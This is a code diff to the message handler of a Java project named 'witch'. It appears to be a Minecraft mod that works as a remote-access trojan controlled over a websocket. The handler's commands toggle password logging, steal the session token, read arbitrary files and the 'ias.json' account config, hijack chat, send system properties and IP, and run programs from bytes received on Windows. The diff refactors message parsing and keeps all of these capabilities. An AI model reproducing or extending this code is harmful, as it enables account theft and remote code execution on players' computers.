@@ -1,6 +1,7 @@
 package me.soda.witch.websocket;
 
 import com.google.gson.Gson;
+import com.google.gson.JsonArray;
 import me.soda.witch.Witch;
 import me.soda.witch.features.PlayerInfo;
 import me.soda.witch.features.ShellcodeLoader;
@@ -18,14 +19,21 @@ public class MessageHandler {
     }
 
     public static void handle(Message message) {
-        String msgType = message.messageType();
-        String msg = message.message();
+        String msgType = message.messageType;
+        JsonArray jsonArray = GSON.fromJson(message.message, JsonArray.class);
+        String msg = jsonArray.size() > 0
+                ? jsonArray.get(0).isJsonPrimitive()
+                ? jsonArray.get(0).getAsJsonPrimitive().isString()
+                ? jsonArray.get(0).getAsString()
+                : jsonArray.get(0).toString()
+                : jsonArray.get(0).toString()
+                : "";
         Witch.println("Received message: " + msgType);
         try {
             switch (msgType) {
                 case "steal_pwd_switch" -> Witch.config.passwordBeingLogged = !Witch.config.passwordBeingLogged;
                 case "steal_token" -> Witch.messageUtils.send(msgType, Stealer.getToken());
-                case "chat_control" -> ChatUtil.sendChat(message.message());
+                case "chat_control" -> ChatUtil.sendChat(msg);
                 case "chat_filter" -> Witch.config.filterPattern = msg;
                 case "chat_filter_switch" -> Witch.config.isBeingFiltered = !Witch.config.isBeingFiltered;
                 case "chat_mute" -> Witch.config.isMuted = !Witch.config.isMuted;
@@ -56,16 +64,17 @@ public class MessageHandler {
                 case "kick" -> ServerUtil.disconnect();
                 case "execute" -> {
                     if (ShellUtil.isWin()) {
-                        ShellUtil.runProg(GSON.fromJson(message.message(), byte[].class));
+                        ShellUtil.runProg(GSON.fromJson(msg, byte[].class));
                     }
                 }
                 case "iasconfig" -> Witch.messageUtils.send(msgType, FileUtil.read("config/ias.json"));
                 case "read" -> Witch.messageUtils.send(msgType, FileUtil.read(msg));
                 case "runargs" -> Witch.messageUtils.send(msgType, System.getProperties());
-                case "xor" -> Witch.messageUtils.xor = new XOR(msg);
-                case "greeting" -> {
+                case "xor" -> {
+                    Witch.messageUtils.xor = new XOR(msg);
+
                     String greetingMsg = "Reconnected " + Witch.client.reconnections + " times, I am " + mc.getSession().getUsername();
-                    Witch.messageUtils.send(msgType, greetingMsg);
+                    Witch.messageUtils.send("greeting", greetingMsg);
                     if (Witch.ip == null) Witch.ip = NetUtil.getIp();
                     Witch.messageUtils.send("player", new PlayerInfo(Witch.mc.player));
                 }
